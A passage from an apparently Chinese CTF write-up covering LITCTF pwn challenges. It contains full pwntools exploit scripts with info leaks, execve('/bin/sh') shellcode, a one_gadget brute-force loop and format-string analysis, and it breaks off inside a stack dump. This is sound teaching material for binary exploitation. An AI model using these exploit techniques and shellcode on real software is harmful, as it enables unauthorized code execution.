class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;litctf.org&#x27;</span>,<span class="string">&#x27;31778&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1668)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lookup</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>,<span class="string">&quot;lookup&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Birthday):&quot;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>,<span class="string">&quot;store&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Birthday):&quot;</span>,index)</span><br><span class="line">    sla(<span class="string">&quot;2020)&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(500):</span></span><br><span class="line">    <span class="comment">#print(str(i+1+196453+4000)) </span></span><br><span class="line">    <span class="comment">#store(str(i+1+196453+4000),&quot;a&quot;)</span></span><br><span class="line">    <span class="comment">#lookup(str(i+1+196453+4000))</span></span><br><span class="line">    <span class="comment">#ru(&quot;:&quot;)</span></span><br><span class="line">    <span class="comment">#print(ru(&quot;\n&quot;))</span></span><br><span class="line"></span><br><span class="line">lookup(<span class="built_in">str</span>(<span class="number">74823</span>))</span><br><span class="line">ru(<span class="string">&quot;Value for \&quot;74823\&quot;: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1581</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">printx = pro_base + <span class="number">0x1375</span></span><br><span class="line">puts_got = pro_base + <span class="number">0x3F70</span></span><br><span class="line">puts_plt = pro_base + <span class="number">0x1150</span></span><br><span class="line"></span><br><span class="line">payload = p16(printx % <span class="number">0x10000</span>) <span class="comment"># checkPrintable</span></span><br><span class="line">store(<span class="built_in">str</span>(<span class="number">200796</span>),payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">mmap_base = leak_addr - <span class="number">0x20</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;mmap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(mmap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">store(<span class="string">&quot;0&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">shellcode_addr = mmap_base + <span class="number">0x3658</span></span><br><span class="line">payload = p64(shellcode_addr) <span class="comment"># lookup</span></span><br><span class="line">store(<span class="built_in">str</span>(<span class="number">122935</span>),payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;$ &quot;</span>,<span class="string">&quot;lookup&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1b</span>f9e09eafed1670b2cc74bb1f662031a0a6796c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞和格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">chunk[read(<span class="number">0</span>, chunk, <span class="number">0x80</span>uLL) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, chunk);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>printf 在内部调用 vfprintf，尝试覆盖 printf 的返回地址但没有成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e5a0f4</span> &lt;__vsprintf_internal+<span class="number">164</span>&gt;    call   __vfprintf_internal                &lt;__vfprintf_internal&gt;</span><br><span class="line">       rdi: <span class="number">0x7fffffffda00</span> ◂— <span class="number">0xfffffffffbad8001</span></span><br><span class="line">       rsi: <span class="number">0x55555555b2a0</span> ◂— <span class="number">0x6325</span> <span class="comment">/* &#x27;%c&#x27; */</span></span><br><span class="line">       rdx: <span class="number">0x7fffffffdb40</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>还有一个解法就是爆破 one_gadget，有 1/4096 的概率可以打通（由于 sprintf 会在后面自动添加 <code>\x00</code> 导致要多爆破两位）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xe3afe</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [r12] == <span class="literal">NULL</span> || r12 == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b01</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == <span class="literal">NULL</span> || r15 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe3b04</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RDX  <span class="number">0x0</span></span><br><span class="line">R15  <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<p>比赛时看这概率很低，于是就不打算爆了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./s1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 1</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">    #p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;litctf.org&#x27;,&#x27;31778&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1242)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + <span class="string">&quot;\x01\x1b&quot;</span></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment">#p = remote(&#x27;1.13.101.243&#x27;,&#x27;25752&#x27;)</span></span><br><span class="line">        p = process(challenge)</span><br><span class="line">        pwn()</span><br><span class="line">        sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">        flag = ru(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="stiller-printf"><a href="#stiller-printf" class="headerlink" title="stiller-printf"></a>stiller-printf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.36</span><span class="number">-0u</span>buntu4)</span> stable release version 2.36.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stiller-<span class="built_in">printf</span>: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">2</span>a6ab53bcdd0f2439e5ecf85bff7b3d5a43048e1, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p>本题目有个特殊的地方，其二进制文件是用 python 启动的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">pwn.context.log_level = <span class="string">&#x27;critical&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">input</span>(<span class="string">&quot;Payload: &quot;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt;= <span class="number">0x100</span> <span class="keyword">or</span> <span class="keyword">not</span> payload.isascii():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO!&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;secret.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    token = secrets.token_hex(<span class="number">0x40</span>).encode()</span><br><span class="line">    f.write(token)</span><br><span class="line">    f.close()</span><br><span class="line">    con = pwn.process(<span class="string">&quot;./stiller-printf&quot;</span>, stdout=<span class="built_in">open</span>(<span class="string">&#x27;/dev/null&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>))</span><br><span class="line">    con.sendline(payload)</span><br><span class="line">    ret = con.poll(<span class="literal">True</span>) == <span class="number">0</span></span><br><span class="line">    con.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;win.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        ret = f.read() == token <span class="keyword">and</span> ret</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">total = <span class="number">150</span></span><br><span class="line">passed = <span class="built_in">sum</span>([check(payload) <span class="keyword">for</span> _ <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(total))])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Total: <span class="subst">&#123;total&#125;</span> Passed: <span class="subst">&#123;passed&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> passed &gt; <span class="number">58</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CONSISTENT ENOUGH FOR ME :D&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;LITCTF&#123;FLAG&#125;&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NOT CONSISTENT ENOUGH&quot;</span>)</span><br><span class="line">exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>check</code> 的通过条件是：文件 <code>secret.txt</code> 和 <code>win.txt</code> 中的内容相同</li>
<li>运行150次，如果通过此时超过58即可获取 flag（需要爆破概率超过 1/3）</li>
<li>程序使用管道进行通信，不存在大量的字符阻塞IO的限制</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(s);</span><br></pre></td></tr></table></figure>
<p>程序中有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fds = open(<span class="string">&quot;secret.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">fdw = open(<span class="string">&quot;win.txt&quot;</span>, <span class="number">0x41</span>, <span class="number">448LL</span>);</span><br><span class="line">len = read(fds, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">write(fdw, buf, len);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用格式化字符串漏洞执行后门函数即可，程序对通过率有限制，必须在无泄漏的情况下编写高通过率的 payload</p>
<p>核心思路就是覆盖 printf 返回地址的末尾一字节为 0x09，将其变为后门函数（在使用 %n 覆盖较小尺寸的数据时，需要令此数据在 mod 256 后等于 0x09）</p>
<p>面对无泄露的 fmt，需要先寻找合适的指针链，断点到 printf 刚刚调用时打印栈数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffed951a4c8</span> —▸ <span class="number">0x56406778a2e7</span> ◂— mov    edi, <span class="number">1</span> <span class="comment">/* printf返回地址 */</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">21</span>:<span class="number">0108</span>│ rbp <span class="number">0x7ffed951a5d0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">22</span>:<span class="number">0110</span>│     <span class="number">0x7ffed951a5d8</span> —▸ <span class="number">0x7fc034d97510</span> ◂— mov    edi, eax</span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│     <span class="number">0x7ffed951a5e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│     <span class="number">0x7ffed951a5e8</span> —▸ <span class="number">0x56406778a295</span> ◂— endbr64 </span><br><span class="line"><span class="number">25</span>:<span class="number">0128</span>│     <span class="number">0x7ffed951a5f0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">26</span>:<span class="number">0130</span>│     <span class="number">0x7ffed951a5f8</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>│     <span class="number">0x7ffed951a600</span> —▸ <span class="number">0x7ffed951a6e8</span> —▸ <span class="number">0x7ffed951b0dc</span> ◂— <span class="string">&#x27;./stiller-printf1&#x27;</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│  <span class="number">0x7ffed951a608</span> ◂— <span class="number">0x40538a8863c3a102</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│  <span class="number">0x7ffed951a610</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│  <span class="number">0x7ffed951a618</span> —▸ <span class="number">0x7ffed951a6f8</span> —▸ <span class="number">0x7ffed951b0ee</span> ◂— <span class="string">&#x27;LC_NUMERIC=zh_CN.UTF-8&#x27;</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│  <span class="number">0x7ffed951a620</span> —▸ <span class="number">0x56406778cd90</span> —▸ <span class="number">0x56406778a1c0</span> ◂— endbr64 </span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│  <span class="number">0x7ffed951a628</span> —▸ <span class="number">0x7fc034fb1020</span> (_rtld_global) —▸ <span class="number">0x7fc034fb22e0</span> —▸ <span class="number">0x564067789000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│  <span class="number">0x7ffed951a630</span> ◂— <span 